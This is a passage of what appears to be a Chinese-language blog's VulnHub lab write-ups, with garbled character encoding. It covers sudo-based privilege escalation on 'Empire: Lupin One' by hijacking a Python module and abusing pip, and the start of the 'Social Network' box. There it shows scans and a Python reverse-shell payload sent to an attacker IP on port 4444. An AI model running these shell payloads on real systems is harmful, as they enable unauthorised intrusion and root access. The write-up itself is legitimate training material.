class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> ssh icex64@192.168.135.152 -i rsa</span>                                                                         <br>Enter passphrase for key &#x27;rsa&#x27;: <br>Linux LupinOne 5.10.0-8-amd64 #1 SMP Debian 5.10.46-5 (2021-09-23) x86_64<br><span class="hljs-meta">#</span><span class="bash"><span class="hljs-comment">#######################################</span></span><br>Welcome to Empire: Lupin One<br><span class="hljs-meta">#</span><span class="bash"><span class="hljs-comment">#######################################</span></span><br>Last login: Thu Oct  7 05:41:43 2021 from 192.168.26.4<br>icex64@LupinOne:~$ id<br>uid=1001(icex64) gid=1001(icex64) groups=1001(icex64)<br></code></pre></td></tr></table></figure><h2 id="ä¸‰ã€æƒé™æå‡"><a href="#ä¸‰ã€æƒé™æå‡" class="headerlink" title="ä¸‰ã€æƒé™æå‡"></a>ä¸‰ã€æƒé™æå‡</h2><p>é€šè¿‡ sudo æƒé™æ‰§è¡Œ python æ–‡ä»¶ï¼Œå°†æƒé™æå‡è‡³ arseneï¼Œå†é€šè¿‡ sudo æƒé™æ‰§è¡Œ pip ï¼Œå°†æƒé™æå‡è‡³ root ã€‚</p><blockquote><p>Linkï¼š<a href="https://gtfobins.github.io">https://gtfobins.github.io</a></p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs shell">icex64@LupinOne:~$ sudo -l<br>Matching Defaults entries for icex64 on LupinOne:<br>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin<br><br>User icex64 may run the following commands on LupinOne:<br>    (arsene) NOPASSWD: /usr/bin/python3.9 /home/arsene/heist.py<br>icex64@LupinOne:~$ ls -l /home/arsene/heist.py<br>-rw-r--r-- 1 arsene arsene 118 Oct  4  2021 /home/arsene/heist.py<br>icex64@LupinOne:~$ cat /home/arsene/heist.py<br>import webbrowser<br><br>print (&quot;Its not yet ready to get in action&quot;)<br><br>webbrowser.open(&quot;https://empirecybersecurity.co.mz&quot;)<br>icex64@LupinOne:~$ find / -name webbrowser.py 2&gt;/dev/null<br>/usr/lib/python3.9/webbrowser.py<br>icex64@LupinOne:~$ ls -l /usr/lib/python3.9/webbrowser.py<br>-rwxrwxrwx 1 root root 24087 Oct  4  2021 /usr/lib/python3.9/webbrowser.py<br>icex64@LupinOne:~$ echo &#x27;import os\nos.system(&quot;/bin/bash&quot;)&#x27; &gt; /usr/lib/python3.9/webbrowser.py<br>icex64@LupinOne:~$ sudo -u arsene /usr/bin/python3.9 /home/arsene/heist.py<br>Traceback (most recent call last):<br>  File &quot;/home/arsene/heist.py&quot;, line 1, in &lt;module&gt;<br>    import webbrowser<br>  File &quot;/usr/lib/python3.9/webbrowser.py&quot;, line 1<br>    import os\nos.system(&quot;/bin/bash&quot;)<br>SyntaxError: unexpected character after line continuation character<br>icex64@LupinOne:~$ cat /usr/lib/python3.9/webbrowser.py<br>import os\nos.system(&quot;/bin/bash&quot;)<br>icex64@LupinOne:~$ echo &#x27;import os&#x27; &gt; /usr/lib/python3.9/webbrowser.py<br>icex64@LupinOne:~$ echo &#x27;os.system(&quot;/bin/bash&quot;)&#x27; &gt;&gt; /usr/lib/python3.9/webbrowser.py<br>icex64@LupinOne:~$ cat /usr/lib/python3.9/webbrowser.py<br>import os<br>os.system(&quot;/bin/bash&quot;)<br>icex64@LupinOne:~$ sudo /usr/bin/python3.9 /home/arsene/heist.py<br>[sudo] password for icex64: <br>Sorry, try again.<br>[sudo] password for icex64: <br>sudo: 1 incorrect password attempt<br>icex64@LupinOne:~$ sudo -u arsene /usr/bin/python3.9 /home/arsene/heist.py<br>arsene@LupinOne:/home/icex64$ id<br>uid=1000(arsene) gid=1000(arsene) groups=1000(arsene),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)<br>arsene@LupinOne:/home/icex64$ sudo -l<br>Matching Defaults entries for arsene on LupinOne:<br>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin<br><br>User arsene may run the following commands on LupinOne:<br>    (root) NOPASSWD: /usr/bin/pip<br>arsene@LupinOne:/home/icex64$ TF=$(mktemp -d)<br>arsene@LupinOne:/home/icex64$ echo &quot;import os; os.execl(&#x27;/bin/sh&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;, &#x27;sh &lt;$(tty) &gt;$(tty) 2&gt;$(tty)&#x27;)&quot; &gt; $TF/setup.py<br>arsene@LupinOne:/home/icex64$ sudo pip install $TF<br>Processing /tmp/tmp.tCNxFRVsTv<br><span class="hljs-meta">#</span><span class="bash"> whoami</span><br>root<br><span class="hljs-meta">#</span><span class="bash"> id</span><br>uid=0(root) gid=0(root) groups=0(root)<br><span class="hljs-meta">#</span><span class="bash"> ls /root</span><br>root.txt<br><span class="hljs-meta">#</span><span class="bash"> cat /root/root.txt</span><br>3mp!r3&#123;congratulations_you_manage_to_pwn_the_lupin1_box&#125;<br>See you on the next heist.<br><span class="hljs-meta">#</span><span class="bash"> ls /home</span><br>arsene  icex64<br><span class="hljs-meta">#</span><span class="bash"> ls /home/icex64</span>      <br>user.txt<br><span class="hljs-meta">#</span><span class="bash"> cat /home/icex64/user.txt</span><br>3mp!r3&#123;I_See_That_You_Manage_To_Get_My_Bunny&#125;<br><span class="hljs-meta">#</span><span class="bash"> ls /home/arsene</span><br>heist.py  note.txt<br><span class="hljs-meta">#</span><span class="bash"> cat /home/arsene/note.txt</span><br>Hi my friend Icex64,<br>Can you please help check if my code is secure to run, I need to use for my next heist.<br>I dont want to anyone else get inside it, because it can compromise my account and find my secret file.<br>Only you have access to my program, because I know that your account is secure.<br>See you on the other side.<br>Arsene Lupin.<br></code></pre></td></tr></table></figure><h2 id="å››ã€æ€»ç»“"><a href="#å››ã€æ€»ç»“" class="headerlink" title="å››ã€æ€»ç»“"></a>å››ã€æ€»ç»“</h2><p>1ã€ç›®å½•æ‰«æï¼šfuffã€wfuzz</p><p>2ã€æ–‡ä»¶æ³„éœ²ï¼šrsa ç§é’¥</p><p>3ã€base58è§£ç ã€ssh2johnã€johnç ´è§£</p><p>4ã€sudo ææƒï¼špythonæ–‡ä»¶ã€pip</p><h2 id="äº”ã€Others"><a href="#äº”ã€Others" class="headerlink" title="äº”ã€Others"></a>äº”ã€Others</h2><p><strong>1ã€sudo å…è®¸ä¸€ä¸ªè¢«æ‰¹å‡†çš„ç”¨æˆ·ä»¥å…¶ä»–ç”¨æˆ·çš„èº«ä»½å»æ‰§è¡Œå‘½ä»¤ï¼š</strong></p><blockquote><p>åŸæ–‡é“¾æ¥ï¼š<a href="https://blog.csdn.net/humanhaunt/article/details/120414681">https://blog.csdn.net/humanhaunt/article/details/120414681</a></p></blockquote><p>æˆ‘ä»¬ç›´æ¥ç•¥è¿‡ä¸Šè¾¹çš„éƒ¨åˆ†ï¼Œç›´æ¥çœ‹ <strong>â€# User privilege specificationâ€</strong> ç”¨æˆ·æƒé™å®šä¹‰éƒ¨åˆ†</p><p>å¤§è‡´å¯ä»¥æè¿°ä¸ºï¼š<strong>who where whom command</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">root    ALL=(ALL:ALL)  ALL<br></code></pre></td></tr></table></figure><ul><li><p>root è¡¨ç¤ºrootç”¨æˆ·</p></li><li><p>ALL è¡¨ç¤ºä»ä»»ä½•çš„ä¸»æœºéƒ½å¯ä»¥æ‰§è¡Œï¼Œä¹Ÿå¯ä»¥è¿™æ ·192.168.100.0/24</p></li><li><p>(ALL:ALL) æ˜¯ä»¥è°çš„èº«ä»½æ¥æ‰§è¡Œï¼ŒALL:ALL å°±è¡¨ç¤º root å¯ä»¥ä»¥ä»»ä½•äººçš„èº«ä»½æ¥æ‰§è¡Œå‘½ä»¤ï¼Œç¬¬ä¸€ä¸ª ALL æ˜¯ç”¨æˆ·ï¼Œç¬¬äºŒä¸ª ALL æ˜¯ç»„</p></li><li><p>ALL è¡¨ç¤ºä»»ä½•å‘½ä»¤</p></li></ul><p>é‚£ä¹ˆæ•´æ¡è§„åˆ™å°±æ˜¯ root ç”¨æˆ·å¯ä»¥åœ¨ä»»ä½•ä¸»æœºä»¥ä»»ä½•äººçš„èº«ä»½æ¥æ‰§è¡Œæ‰€æœ‰çš„å‘½ä»¤ã€‚</p><p>åœ¨çœ‹ä¸‹é¢è¿™ä¸ªå®šä¹‰ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> å…è®¸ wheel ç»„ä¸­çš„æ‰€æœ‰äººè¿è¡Œæ‰€æœ‰çš„å‘½ä»¤ï¼Œè¿™å°±å¯ä»¥è¯´æ˜æŠŠç”¨æˆ·åŠ å…¥åˆ° wheel ç»„å°±å¯ä»¥ä½¿ç”¨ sudo å‘½ä»¤</span><br><span class="hljs-meta">%</span><span class="bash">wheel  ALL=(ALL) ALL</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> åªå…è®¸ nick ç”¨æˆ·åœ¨ 192.168.10.0/24 ç½‘æ®µä¸Šè¿æ¥ä¸»æœºå¹¶ä¸”ä»¥ root æƒé™æ‰§è¡Œ useradd å‘½ä»¤</span><br>nick   192.168.10.0/24=(root)  /usr/sbin/useradd<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> sudoers é…ç½®å¯ä»¥åœ¨å‘½ä»¤éƒ¨åˆ†é™„åŠ é€‰é¡¹ï¼Œæ¯”å¦‚è®¾ç½®æ‰§è¡Œ sudo æ—¶ä¸éœ€è¦è¾“å…¥å¯†ç </span><br>nick ALL=(ALL) NOPASSWD: ALL<br></code></pre></td></tr></table></figure><p><strong>/etc/sudoersï¼š</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> cat /etc/sudoers</span><br><span class="hljs-meta">#</span><span class="bash"></span><br><span class="bash"><span class="hljs-comment"># This file MUST be edited with the &#x27;visudo&#x27; command as root.</span></span><br><span class="hljs-meta">#</span><span class="bash"></span><br><span class="bash"><span class="hljs-comment"># Please consider adding local content in /etc/sudoers.d/ instead of</span></span><br><span class="hljs-meta">#</span><span class="bash"> directly modifying this file.</span><br><span class="hljs-meta">#</span><span class="bash"></span><br><span class="bash"><span class="hljs-comment"># See the man page for details on how to write a sudoers file.</span></span><br><span class="hljs-meta">#</span><span class="bash"></span><br><span class="bash">Defaults        env_reset</span><br>Defaults        mail_badpass<br>Defaults        secure_path=&quot;/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> Host <span class="hljs-built_in">alias</span> specification</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> User <span class="hljs-built_in">alias</span> specification</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> Cmnd <span class="hljs-built_in">alias</span> specification</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> User privilege specification</span><br>root    ALL=(ALL:ALL) ALL<br>icex64 ALL=(arsene) NOPASSWD: /usr/bin/python3.9 /home/arsene/heist.py<br>arsene ALL=(root) NOPASSWD: /usr/bin/pip<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> Allow members of group sudo to execute any <span class="hljs-built_in">command</span></span><br><span class="hljs-meta">%</span><span class="bash">sudo   ALL=(ALL:ALL) ALL</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> See sudoers(5) <span class="hljs-keyword">for</span> more information on <span class="hljs-string">&quot;@include&quot;</span> directives:</span><br><br>@includedir /etc/sudoers.d<br></code></pre></td></tr></table></figure><p><strong>2ã€pip sudo ææƒï¼š</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> TF=$(mktemp -d)</span><br><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;import os; os.execl(&#x27;/bin/sh&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;, &#x27;sh &lt;<span class="hljs-subst">$(tty)</span> &gt;<span class="hljs-subst">$(tty)</span> 2&gt;<span class="hljs-subst">$(tty)</span>&#x27;)&quot;</span> &gt; <span class="hljs-variable">$TF</span>/setup.py</span><br><span class="hljs-meta">$</span><span class="bash"> sudo pip install <span class="hljs-variable">$TF</span></span><br><span class="hljs-meta"></span><br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> mktemp: åˆ›å»ºä¸´æ—¶æ–‡ä»¶æˆ–è€…ç›®å½•ï¼Œè¿™æ ·çš„åˆ›å»ºæ–¹å¼æ˜¯å®‰å…¨çš„ã€‚-d: ç›®å½•</span><br><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">echo</span> <span class="hljs-variable">$TF</span></span><br>/tmp/tmp.D5iHBC0ZvC<br><span class="hljs-meta">#</span><span class="bash"> $()ä¸ `` (åå¼•å·)ï¼šè¿”å›æ‹¬å·ä¸­å‘½ä»¤çš„ç»“æœ</span><br><span class="hljs-meta">#</span><span class="bash"> åœ¨bashä¸­ï¼Œ$()ä¸ ``ï¼ˆåå¼•å·ï¼‰éƒ½æ˜¯ç”¨æ¥ä½œå‘½ä»¤æ›¿æ¢çš„ï¼Œæ‰§è¡Œæ‹¬å·æˆ–è€…åå¼•å·ä¸­çš„å‘½ä»¤ã€‚</span><br><span class="hljs-meta">#</span><span class="bash"> å‘½ä»¤æ›¿æ¢ä¸å˜é‡æ›¿æ¢å·®ä¸å¤šï¼Œéƒ½æ˜¯ç”¨æ¥é‡ç»„å‘½ä»¤è¡Œçš„ï¼Œå…ˆå®Œæˆå¼•å·é‡Œçš„å‘½ä»¤è¡Œï¼Œç„¶åå°†å…¶ç»“æœæ›¿æ¢å‡ºæ¥ï¼Œå†é‡ç»„æˆæ–°çš„å‘½ä»¤è¡Œã€‚</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Penetration</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Penetration</tag>
      
      <tag>vulnhub</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BoredHackerBlogï¼šSocial Network</title>
    <link href="/2022/07/01/Penetration/Vulnhub/Part-1/0x0F%20BoredHackerBlog-Social-Network/"/>
    <url>/2022/07/01/Penetration/Vulnhub/Part-1/0x0F%20BoredHackerBlog-Social-Network/</url>
    
    <content type="html"><![CDATA[<h1 id="0x0F-BoredHackerBlog-Social-Network-vulnhub"><a href="#0x0F-BoredHackerBlog-Social-Network-vulnhub" class="headerlink" title="0x0F BoredHackerBlog: Social Network~vulnhub"></a>0x0F BoredHackerBlog: Social Network~vulnhub</h1><blockquote><p>é¶æœºåœ°å€ï¼š<a href="https://www.vulnhub.com/entry/boredhackerblog-social-network,454/">BoredHackerBlog: Social Network ~ VulnHub</a></p><p>ç¯å¢ƒä¿¡æ¯ï¼š</p><ul><li>æ”»å‡»æœº IPï¼š192.168.135.141</li><li>é¶æœº IPï¼š192.168.135.151</li></ul></blockquote><h2 id="ä¸€ã€ä¿¡æ¯æ”¶é›†"><a href="#ä¸€ã€ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¸€ã€ä¿¡æ¯æ”¶é›†"></a>ä¸€ã€ä¿¡æ¯æ”¶é›†</h2><h3 id="1ã€ä¸»æœºæ¢æµ‹"><a href="#1ã€ä¸»æœºæ¢æµ‹" class="headerlink" title="1ã€ä¸»æœºæ¢æµ‹"></a>1ã€ä¸»æœºæ¢æµ‹</h3><p><strong>nmap å‘½ä»¤ï¼š</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> nmap -sn 192.168.135.0/24</span><br></code></pre></td></tr></table></figure><p><strong>å¾—åˆ°é¶æœº ipï¼š192.168.135.151</strong></p><h3 id="2ã€ç«¯å£æ‰«æ"><a href="#2ã€ç«¯å£æ‰«æ" class="headerlink" title="2ã€ç«¯å£æ‰«æ"></a>2ã€ç«¯å£æ‰«æ</h3><p><strong>ç«¯å£æ‰«æï¼š</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> sudo nmap -sS -A -p- 192.168.135.151</span>  <br>[sudo] password for kali: <br>Starting Nmap 7.91 ( https://nmap.org ) at 2022-07-01 05:10 EDT<br>Nmap scan report for 192.168.135.151<br>Host is up (0.00082s latency).<br>Not shown: 65533 closed ports<br>PORT     STATE SERVICE VERSION<br>22/tcp   open  ssh     OpenSSH 6.6p1 Ubuntu 2ubuntu1 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey: <br>|   1024 cc:53:20:b8:10:db:52:5f:16:02:bc:ee:57:22:80:e1 (DSA)<br>|   2048 01:50:f6:1f:32:e8:0d:fc:48:38:3e:c8:1b:ac:20:02 (RSA)<br>|   256 3b:ae:9a:bd:cb:ff:8f:54:64:32:ec:bf:38:fd:fe:6b (ECDSA)<br>|_  256 77:4e:8b:20:73:52:a4:ee:93:1d:b3:85:f2:25:d7:55 (ED25519)<br>5000/tcp open  http    Werkzeug httpd 0.14.1 (Python 2.7.15)<br>|_http-server-header: Werkzeug/0.14.1 Python/2.7.15<br>|_http-title: Leave a message<br>MAC Address: 00:0C:29:A9:17:61 (VMware)<br>Device type: general purpose<br>Running: Linux 3.X|4.X<br>OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4<br>OS details: Linux 3.2 - 4.9<br>Network Distance: 1 hop<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>TRACEROUTE<br>HOP RTT     ADDRESS<br>1   0.82 ms 192.168.135.151<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap done: 1 IP address (1 host up) scanned in 23.17 seconds<br></code></pre></td></tr></table></figure><p><strong>å¾—åˆ°ç›®æ ‡ç«¯å£ä¿¡æ¯ï¼š</strong></p><div class="table-container"><table><thead><tr><th>PORT</th><th>STATE</th><th>SERVICE</th><th>å…¶ä»–</th></tr></thead><tbody><tr><td>22/tcp</td><td>open</td><td>ssh</td><td>OpenSSH 6.6p1 Ubuntu 2ubuntu1 (Ubuntu Linux; protocol 2.0)</td></tr><tr><td>5000/tcp</td><td>open</td><td>http</td><td>Werkzeug httpd 0.14.1 (Python 2.7.15)</td></tr></tbody></table></div><h3 id="3ã€ç«¯å£æ¢æµ‹"><a href="#3ã€ç«¯å£æ¢æµ‹" class="headerlink" title="3ã€ç«¯å£æ¢æµ‹"></a>3ã€ç«¯å£æ¢æµ‹</h3><p><strong>22ç«¯å£</strong></p><p>æš‚æ—¶æœªå¾—åˆ° username å’Œ password çš„ç›¸å…³ä¿¡æ¯ï¼Œæ— æ³•ä½¿ç”¨ ssh</p><p><strong>5000ç«¯å£</strong></p><p>è®¿é—®å‘ç°æ˜¯ä¸ªç•™è¨€ç½‘ç«™ï¼Œå°è¯• SSTIï¼ˆæ¨¡æ¿æ³¨å…¥ï¼‰ï¼Œè¾“å…¥äº† <code>&#123;&#123;2*2&#125;&#125;</code> å‘ç°ä¸ç”Ÿæ•ˆ ã€‚</p><p>è¿›è¡Œç›®å½•çˆ†ç ´ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> dirb http://192.168.135.151:5000</span><br>-----------------<br>URL_BASE: http://192.168.135.151:5000/<br>WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt<br>-----------------<br><br>---- Scanning URL: http://192.168.135.151:5000/ ----<br>+ http://192.168.135.151:5000/admin (CODE:200|SIZE:401)<br></code></pre></td></tr></table></figure><h2 id="äºŒã€æƒé™è·å–"><a href="#äºŒã€æƒé™è·å–" class="headerlink" title="äºŒã€æƒé™è·å–"></a>äºŒã€æƒé™è·å–</h2><p>è®¿é—® <code>http://192.168.135.151:5000/admin</code> ï¼Œæ„Ÿè§‰å¥½åƒå¯ä»¥æ‰§è¡Œä»£ç ï¼š</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">Admin page<br>Code testing page<br>Status:<br>Nothing was ran. Input some code to exec()<br><br><span class="hljs-section">Code input:</span><br><span class="hljs-section">----------</span><br><span class="hljs-section">Test code</span><br><span class="hljs-section">----------</span><br><span class="hljs-code"> _________________</span><br><span class="hljs-code"> Enter code here</span><br><span class="hljs-code"> _________________</span><br></code></pre></td></tr></table></figure><p>å°è¯• python åå¼¹ shell ï¼š</p><blockquote><p><a href="https://forum.ywhack.com/shell.php">[~]#æ£±è§’ ::Edge.Forum* (ywhack.com)</a></p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell">import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.135.141&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;])<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> ä¸å¯</span><br>import socket,subprocess,os;s=socket.socekt(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.135.141&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;])<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.135.141&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;])&#x27;</span> | md5sum</span><br>fd0d94202670c274cffc4fad433de106  -<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;import socket,subprocess,os;s=socket.socekt(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.135.141&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;])&#x27;</span> | md5sum</span><br>58a4412023c9b9c631546c19bc4f6c0c  -<br></code></pre></td></tr></table></figure><p>nc ç›‘å¬ï¼ŒæˆåŠŸåå¼¹ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> nc -lnvp 4444</span>            <br>listening on [any] 4444 ...<br>connect to [192.168.135.141] from (UNKNOWN) [192.168.135.151] 53558<br>/app # whoami<br>root<br>/app # id<br>uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)<br>/app # ls -l<br>total 16<br>-rw-r--r--    1 root     root           182 Oct 29  2018 Dockerfile<br>-rw-r--r--    1 root     root          1326 Oct 29  2018 main.py<br>-rw-r--r--    1 root     root             6 Oct 28  2018 requirements.txt<br>drwxr-xr-x    2 root     root          4096 Oct 29  2018 templates<br></code></pre></td></tr></table></figure><p>è¿™ä¸ªæ—¶å€™ï¼Œé¦–å…ˆå‘ç°å¾—åˆ°çš„ shell çš„è¡Œå¤´æ˜¯ï¼š/app #ï¼ŒæŸ¥çœ‹å½“å‰ç›®å½•çš„æ–‡ä»¶æ—¶å‘ç°äº† Dockerfileï¼Œè®©äººæ€€ç–‘è‡ªå·±æ˜¯åœ¨ docker é‡Œé¢ã€‚</p><blockquote><p>æ–¹æ³•1ï¼šå¦‚æœæ ¹ç›®å½•ä¸‹å­˜åœ¨ dockerenvï¼Œé‚£ä¹ˆæœ‰æå¤§çš„æ¦‚ç‡ï¼Œæˆ‘ä»¬æ˜¯åœ¨ docker ç¯å¢ƒä¸­<br>æ–¹æ³•2ï¼šæŸ¥çœ‹ ipï¼Œå¦‚æœ ip ä¸ç½‘ç«™ ip ä¸åŒï¼Œé‚£ä¹ˆæœ‰æå¤§çš„æ¦‚ç‡ï¼Œæˆ‘ä»¬æ˜¯åœ¨ docker ç¯å¢ƒä¸­<br>æ–¹æ³•3ï¼šå¦‚æœ /proc/1/cgroup æ–‡ä»¶é‡Œé¢å¯ä»¥çœ‹åˆ° dockerï¼Œä»¥åŠ docker çš„ hash å€¼ã€‚é‚£ä¹ˆæˆ‘ä»¬ä¸€å®šåœ¨ docker ç¯å¢ƒä¸­ã€‚</p></blockquote><figure class="highlight 